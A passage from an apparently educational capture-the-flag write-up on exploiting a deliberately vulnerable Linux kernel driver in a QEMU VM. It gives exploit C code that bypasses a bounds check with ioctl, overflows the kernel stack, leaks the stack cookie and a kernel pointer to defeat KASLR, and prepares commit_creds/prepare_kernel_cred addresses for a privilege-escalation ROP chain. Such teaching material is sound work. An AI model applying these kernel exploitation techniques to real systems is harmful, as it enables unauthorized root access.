<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87</span>        exploit[counter <span style="color:#ff79c6">+</span> i] <span style="color:#ff79c6">=</span> a;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89</span>    counter <span style="color:#ff79c6">+=</span> len;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90</span>    <span style="color:#ff79c6">return</span> len;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">s64</span>(uint64_t val){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94</span>    <span style="color:#ff79c6">*</span>(uint64_t <span style="color:#ff79c6">*</span>)(exploit <span style="color:#ff79c6">+</span> counter) <span style="color:#ff79c6">=</span> val;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95</span>    counter <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">8</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96</span>    <span style="color:#ff79c6">return</span> counter;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101</span>    save_state();
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103</span>    <span style="color:#6272a4">/* your exploit here */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106</span>    <span style="color:#6272a4">/*                   */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108</span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112</span>    <span style="color:#ff79c6">return</span> pwn();
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114</span>
</code></pre></div><p>Okay, first let&rsquo;s create a function which will get the handle to the vulnerable device.
In this challenge the vulnerable driver is in &ldquo;<strong>/proc/pwn_device</strong>&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">get_device</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/proc/pwn_device&#34;</span>, O_RDWR);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>	<span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>		puts(<span style="color:#f1fa8c">&#34;[!] Failed to open device&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>	} <span style="color:#ff79c6">else</span> {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span>        puts(<span style="color:#f1fa8c">&#34;[*] Opened device&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span>    }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span>}
</code></pre></div><p>We can call this function inside the <strong>pwn()</strong> to get the file descriptor.
Now let&rsquo;s try to read from the driver and let&rsquo;s see if we receive the &ldquo;<strong>Welcome to this kernel pwn series</strong>&rdquo; string or not.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    get_device(); <span style="color:#6272a4">/* opens the driver */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#8be9fd">char</span> buffer[<span style="color:#bd93f9">0x100</span>] <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    read(fd, buffer, <span style="color:#bd93f9">0x100</span>); <span style="color:#6272a4">/* read into buffer */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    puts(buffer); <span style="color:#6272a4">/* print everythin we read */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>}
</code></pre></div><p>Just put this pwn function in your exploit.c and then build it.
For building the exploit i use a <strong>Makefile</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Makefile" data-lang="Makefile"><span style="color:#50fa7b">all</span><span style="color:#ff79c6">:</span>
	musl-gcc -O3 -static exploit.c -o fs/exploit
</code></pre></div><p>Now we need to run <strong>make</strong> in terminal to build the exploit
and then use the <strong>rebuild_fs.sh</strong> script to build the initramfs</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/buildcommands.png"
    alt="build commands"
    decoding="async"
  />
</div>
<p>Now we can run the VM to test our exploit using &ldquo;<strong>./launch.sh</strong>&rdquo;
Once in the VM, you can run the exploit by running &ldquo;<strong>/exploit</strong>&rdquo;</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/readoutput.png"
    alt="build commands"
    decoding="async"
  />
</div>
<p>Okay, our read syscall read the string which is perfect.
Let&rsquo;s try crashing the kernel by currupting the stack.</p>
<p>before we can overwrite important stuff on the stack, we need to bypass
the bound check which was comparing the <strong>nbytes</strong> to <strong>MaxBuffer</strong>.</p>
<p>To bypass the check we need to do an ioctl syscall and send the new value of <strong>MaxBuffer</strong> with command #32.
Now, we can send a bunch of &ldquo;A&quot;s to see if a kernel bruh moment happens or not.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    get_device(); <span style="color:#6272a4">/* opens the driver */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    ioctl(fd, <span style="color:#bd93f9">32</span>, <span style="color:#ff79c6">sizeof</span>(exploit));
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    memset(exploit, <span style="color:#f1fa8c">&#39;A&#39;</span>, <span style="color:#ff79c6">sizeof</span>(exploit));
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    write(fd, exploit, <span style="color:#ff79c6">sizeof</span>(exploit));
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>}
</code></pre></div><p>Running the exploit leads to a kernel panic because we corrupted the stack canary.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kernelpanic.png"
    alt="kernel bruh moment"
    decoding="async"
  />
</div>
<h3 id="rip-control">RIP Control</h3>
<p>The reason for kernel panic in the above picture is that we corrupted the stack cookie and not the actual return address.</p>
<p>How do we leak the cookie?
Remember we have a Memory Leak Vulnerability in <strong>sread</strong>? we can use that bug to leak stack cookie.</p>
<p>I will use <a href="https://github.com/hugsy/gef">gdb-gef</a> gdb plugin because it&rsquo;s faster than my other favorite gdb plugin (pwndbg)
We also need the uncompressed <strong>vmlinux</strong> file from the compressed <strong>bzImage</strong>. To extract <strong>vmlinux</strong> i will use this <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">script</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">$ ./extract-vmlinux.sh ./bzImage &gt; vmlinux
$ file ./vmlinux
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), ... stripped
</code></pre></div><p>For debugging i like the setup where i have both gdb and the vm opened side by side.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/setup.png"
    alt="kernel bruh moment"
    decoding="async"
  />
</div>
<p>Also for debugging i edited the &ldquo;<strong>fs/init</strong>&rdquo; file to give us root access on the VM.
And i also disabled <strong>KASLR</strong> in the <strong>./launch.sh</strong></p>
<p>First thing you may want to do is comment out the 12th line in <strong>fs/init</strong> to get root access on the VM.
For enabeling gdbserver in <strong>qemu-system-x86_64</strong> you must add the &ldquo;<strong>-s</strong>&rdquo; flag in &ldquo;<strong>./launch.sh</strong>&rdquo;.
For disabling <strong>KASLR</strong> you must replace &ldquo;<strong>kaslr</strong>&rdquo; with &ldquo;<strong>nokaslr</strong>&rdquo; in &ldquo;<strong>./launch.sh</strong>&rdquo;</p>
<p>Modified &ldquo;<strong>fs/init</strong>&quot;:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">#!/bin/sh
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6"></span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>mount -t proc none /proc
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>mount -t sysfs none /sys
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>mount -t 9p -o <span style="color:#8be9fd;font-style:italic">trans</span><span style="color:#ff79c6">=</span>virtio,version<span style="color:#ff79c6">=</span>9p2000.L,nosuid hostshare /home/ctf
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>insmod /vuln.ko
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>chown root /flag.txt
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>chmod <span style="color:#bd93f9">700</span> /flag.txt
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>
<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#6272a4"># exec su -l ctf # comment me to gain root</span>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>/bin/sh
</code></pre></div><p>Modified &ldquo;<strong>./launch.sh</strong>&quot;:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">#!/bin/bash
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6"></span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#8be9fd;font-style:italic">SCRIPT_DIR</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span> <span style="color:#8be9fd;font-style:italic">cd</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">$(</span> dirname <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">BASH_SOURCE</span>[0]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span> &amp;&gt; /dev/null <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">pwd</span> <span style="color:#ff79c6">)</span><span style="color:#f1fa8c">&#34;</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>/usr/bin/qemu-system-x86_64 <span style="color:#f1fa8c">\
</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#f1fa8c"></span>    -s <span style="color:#f1fa8c">\
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#f1fa8c"></span>	-m 64M <span style="color:#f1fa8c">\
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#f1fa8c"></span>	-cpu kvm64,+smep,+smap <span style="color:#f1fa8c">\
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#f1fa8c"></span>	-kernel <span style="color:#8be9fd;font-style:italic">$SCRIPT_DIR</span>/bzImage <span style="color:#f1fa8c">\
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#f1fa8c"></span>	-initrd <span style="color:#8be9fd;font-style:italic">$SCRIPT_DIR</span>/initramfs.cpio.gz <span style="color:#f1fa8c">\
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#f1fa8c"></span>	-nographic <span style="color:#f1fa8c">\
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#f1fa8c"></span>	-monitor none <span style="color:#f1fa8c">\
</span><span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#f1fa8c"></span>	-append <span style="color:#f1fa8c">&#34;console=ttyS0 nokaslr quiet panic=1&#34;</span> <span style="color:#f1fa8c">\
</span></span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#f1fa8c"></span>	-no-reboot
</code></pre></div><p>Now <strong>qemu-system-x86_64</strong> is running in debug mode. You can attach to it using gdb
just run &ldquo;<strong>target remote :1234</strong>&rdquo; to attach to the kernel.</p>
<p>You can get the addresses of functions in the driver by greping &ldquo;<strong>/proc/kallsyms</strong>&rdquo;
if you don&rsquo;t have root access on the VM, all the addresses will be 0s. For getting the
addresses you must have root access</p>
<p>This is what you will see when you don&rsquo;t have root access.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kallsymswithoutroot.png"
    alt="without root"
    decoding="async"
  />
</div>
<p>This is what you will see when you have root access.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/kallsymsroot.png"
    alt="root"
    decoding="async"
  />
</div>
<p>Now that we have the addresses and we also have disabled <strong>KASLR</strong>, we can easily debug the kernel.</p>
<p>For Leaking the stack cookie, we will use the sread function to read 0x400 bytes to us.
So, first let&rsquo;s set a breakpoint at sread.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/sread_breakpoint.png"
    alt="breakpoint"
    decoding="async"
  />
</div>
<p>I created a <strong>do_read()</strong> function which takes a buffer and number of bytes as argument and does the read syscall for you, and similarly other helper functions.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_read</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    <span style="color:#ff79c6">return</span> read(fd, buffer, size);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_ioctl</span>(<span style="color:#8be9fd">int</span> cmd, <span style="color:#8be9fd">int</span> arg){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    <span style="color:#ff79c6">return</span> ioctl(fd, cmd, arg);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">do_write</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> buffer, <span style="color:#8be9fd">int</span> size){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    <span style="color:#ff79c6">return</span> write(fd, buffer, size);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>}
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">pwn</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    save_state(); <span style="color:#6272a4">/* saves useful registers */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    get_device(); <span style="color:#6272a4">/* opens the driver */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    <span style="color:#6272a4">/* leak stack_cookie */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    memset(exploit, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0x1000</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    do_read(exploit, <span style="color:#bd93f9">0x400</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>    telescope(exploit, <span style="color:#bd93f9">0x400</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>}
</code></pre></div><p>After setting the breakpoint, you can continue execution and run the exploit in the VM.</p>
<p>Once the breakpoint is hit, inspect the Kernel Stack to see if you can spot the stack cookie.
In the below screenshot you can see the stack cookie is placed on the stack.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/cookie.png"
    alt="cookie"
    decoding="async"
  />
</div>
<p>In this screenshot you can see the layout of the stack.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/stacklayout_sread.png"
    alt="stack layout for sread"
    decoding="async"
  />
</div>
<p>The <strong>telescope()</strong> function will print the leaked stack into hex format.
This is the output we get.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/telescope.png"
    alt="telescope"
    decoding="async"
  />
</div>
<p>So you can see we are able to leak the stack cookie at an offset of 0x80 and 0x70.
You can also see that we are able to leak a Kernel Pointer at offset 0x90, using this leak we can bypass <strong>KASLR</strong>.
We have disabled <strong>KASLR</strong> and hence for us the Kernel Base address is <strong>0xffffffff81000000</strong>
We can easily get the offset of this kernel pointer by subtracting the Kernel Base address from the leaked value and we get <strong>0x23e347</strong>, we can also calculate the address of some crucial functions like <strong>commit_cred</strong> and <strong>prepare_kernel_cred</strong>.
We will discuss more about these function when we will construct our ROP Chain.
So, we add this in our <strong>pwn()</strong> function.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>    uint64_t stack_cookie <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(uint64_t <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>exploit[<span style="color:#bd93f9">0x80</span>];
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    uint64_t kernel_base  <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(uint64_t <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>exploit[<span style="color:#bd93f9">0x90</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x23e347</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>    uint64_t commit_creds <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x87e80</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>    uint64_t prepare_kernel_cred <span style="color:#ff79c6">=</span> kernel_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x881c0</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>    
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span>    printf(<span style="color:#f1fa8c">&#34;[+] Stack Cookie : 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, stack_cookie);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span>    printf(<span style="color:#f1fa8c">&#34;[+] Kernel Base  : 0x%.16lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_base);
</code></pre></div><p>This is what it looks like when you run the exploit now.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/leak.png"
    alt="leak"
    decoding="async"
  />
</div>
<p>Now we can move on to writing a ROP Chain, but before we talk about that we must know what can we do to gain root privileges.</p>
<h3 id="prepare_kernel_cred-and-commit_creds">prepare_kernel_cred and commit_creds</h3>
<p>The kernel tracks the user privileges (and other data) of every running process in the <strong>task_struct</strong> structure.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">struct</span> task_struct {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    <span style="color:#ff79c6">struct</span> thread_info    	thread_info;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    <span style="color:#6272a4">/* -1 unrunnable, 0 runnable, &gt;0 stopped: */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    <span style="color:#ff79c6">volatile</span> <span style="color:#8be9fd">long</span>         	state;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    <span style="color:#8be9fd">void</span>                  	<span style="color:#ff79c6">*</span>stack;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    atomic_t              	usage;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>	<span style="color:#6272a4">// ...
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span>                   	prio;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#8be9fd">int</span>                   	static_prio;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    <span style="color:#8be9fd">int</span>                   	normal_prio;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>          	rt_priority;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    <span style="color:#ff79c6">struct</span> sched_info     	sched_info;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    <span style="color:#ff79c6">struct</span> list_head      	tasks;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    pid_t                 	pid;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    pid_t                 	tgid;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>    <span style="color:#6272a4">/* Process credentials: */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    <span style="color:#6272a4">/* Objective and real subjective task credentials (COW): */</span>
